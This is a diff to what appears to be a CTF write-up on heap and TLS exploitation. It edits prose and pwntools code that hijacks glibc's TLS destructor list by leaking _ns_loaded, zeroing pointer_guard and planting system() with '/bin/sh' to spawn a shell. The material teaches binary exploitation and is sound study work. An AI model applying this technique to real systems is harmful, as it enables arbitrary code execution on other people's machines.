@@ -169,7 +169,8 @@ struct dtor_list
 
 > The linker ld has a global variable ``__nptl_rtld_global`` that points to the global variable ``_rtld_global``, which finally points to the ``rtld_global`` structure. Its first field is ``_ns_loaded`` [...]
 
-- With multiple reads we can leak `_ns_loaded` value, which happens to be `0x502e0` bytes to TLS Storage base address. Now we just have to create a fake ``dtor_func func`` and ``obj`` and write at 0x6e8 the pointer to it. We can overwrite `pointer_guard` with 0 so the XOR does not modify our pointer. Finally, we can write after 0x6e8 the address of `system() << 17 (remember the ROR)` and after it the address of the string `/bin/sh\x00`.
+- With multiple reads we can leak `_ns_loaded` value, which happens to be `0x502e0` bytes to TLS Storage base address. Now we just have to create a fake ``dtor_func func`` and ``obj`` and write at 0x6e8 the pointer to it. We can overwrite `pointer_guard` with 0 so the XOR does not modify our pointer (another way to handle this is to leak `pointer_guard` and calculate the XOR ourselves). Finally, we can write after 0x6e8 the address of `system() << 17 (remember the ROR)` and after it the address of the string `/bin/sh\x00`.
+
 
 ```python
 # Modify dtor_list
@@ -191,8 +192,7 @@ arb_write(10, tls_func, flat(libc.sym.system << 17) + flat(sh)[:6]) # We can onl
 - The original author used one big write to overwrite 0x6e8 and crafted his fake `dtor_list` right after it, but this approach also works well when we only have small writes. We can modify the pointer at 0x6e8 with _any_ address that has our fake ``dtor_list`` correctly set up. In the next example I create my fake struct inside the `accounts` array using ``create_account()`` (without arb write)
 
 ```python
-tls_func = exe.sym.accounts + 336
-arb_write(6, tls_target, flat(tls_func))
+arb_write(6, tls_target, flat(exe.sym.accounts + 336))
 arb_write(8, tls_cookie, flat(0x0))
 create_account(10, flat(libc.sym.system << 17) + flat(next(libc.search(b'/bin/sh\x00')))[:6], b'AAAA')
 ```
